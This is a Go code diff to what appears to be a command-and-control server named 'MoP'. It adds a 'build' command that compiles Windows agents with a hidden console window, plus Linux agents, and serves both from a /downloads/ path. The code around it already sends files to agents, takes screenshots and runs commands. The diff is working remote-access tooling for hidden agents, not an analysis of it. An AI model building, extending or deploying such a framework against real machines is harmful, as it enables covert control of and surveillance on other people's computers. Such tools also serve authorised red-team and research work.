@@ -4,6 +4,8 @@ import (
 	"MoP/src/controllers"
 	"MoP/src/messages"
 	"fmt"
+	"os"
+	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -78,7 +80,7 @@ func UploadFile(agent string, command []string) {
 		err := controllers.SendFile(uint64(agentID), command[1], fileName)
 		if err != nil {
 			fmt.Println()
-			
+
 			fmt.Println()
 		}
 	} else {
@@ -118,6 +120,24 @@ func TakeScrenshot(agent string, command []string) {
 	}
 }
 
+func BuildAgents(agentName string, host string) {
+	path, _ := os.Getwd()
+	serverPath := filepath.Join(filepath.Dir(path), "agents", agentName)
+	agentPath := filepath.Join(filepath.Dir(path), "agent", "agent.go")
+	commands := [2]string{"GOOS=windows go build -ldflags -H=windowsgui  -o " + serverPath + ".exe " + agentPath,
+		"go build -o " + serverPath + " " + agentPath}
+	for _, command := range commands {
+		_, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
+		if err != nil {
+			messages.ErrorMessage("build agent", err)
+			return
+		}
+	}
+	fmt.Println()
+	fmt.Printf("[+] Agents URL:\n\t- %s/downloads/%s.exe\n\t- %s/downloads/%s", host, agentName, host, agentName)
+	fmt.Println()
+}
+
 func Help() string {
 	help := `
 	SERVER COMMANDS:
@@ -125,6 +145,8 @@ func Help() string {
 		!<command>: run SO command on server machine.
 
 		alias <alias>: set an alias to an agent when one that agent is selected.
+
+		build <name>: build Linux and Windows agents and put them on a File Server at http(s)://server/downloads/ (default name "agent").
 
 		help: show this help.
 	
